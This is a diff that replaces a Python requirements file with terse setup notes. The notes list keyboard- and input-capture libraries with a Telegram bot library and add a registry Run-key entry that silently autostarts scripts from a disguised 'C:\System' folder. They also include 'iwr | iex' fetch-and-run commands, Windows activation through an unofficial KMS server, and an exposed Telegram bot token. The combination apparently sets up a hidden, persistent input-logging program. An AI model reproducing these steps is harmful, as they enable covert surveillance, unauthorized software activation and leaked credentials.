@@ -1,27 +1,26 @@
-anyio==4.0.0
-asgiref==3.7.2
-certifi==2023.7.22
-charset-normalizer==3.2.0
-config==0.5.1
-Django==4.2.4
-django-scheduler==0.10.1
-h11==0.14.0
-httpcore==0.17.3
-httpx==0.24.1
-icalendar==5.0.7
-idna==3.4
-keyboard==0.13.5
-pynput==1.7.6
-pyTelegramBotAPI==4.13.0
-python-dateutil==2.8.2
-python-telegram-bot==20.4
-pytz==2023.3
-requests==2.31.0
-schedule==1.2.0
-six==1.16.0
-sniffio==1.3.0
-sqlparse==0.4.4
-telebot==0.0.5
-telegram==0.0.1
-tzdata==2023.3
-urllib3==2.0.4
+#pip install
+pynput
+telebot
+
+
+keyboard
+six
+
+
+#regedit
+Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+"C:\Pythons\Python3.11\pythonw.exe" "C:\System\proga.py"
+"C:\Pythons\Python3.11\pythonw.exe" "C:\System\progav2.py"
+
+#spotify
+iwr -useb https://raw.githubusercontent.com/spicetify/spicetify-cli/master/install.ps1 | iex
+iwr -useb https://raw.githubusercontent.com/spicetify/spicetify-marketplace/main/resources/install.ps1 | iex
+
+#winda
+slmgr/ipk W269N-WFGWX-YVC9B-4J6C9-T83GX
+slmgr /skms kms.digiboy.ir
+slmgr /ato
+
+#telegram
+https://api.telegram.org/bot6071630449:AAHslhDKXn83m8gsfsB8m4_hQvw9-9N5pWE/getUpdates --- to get user id
+
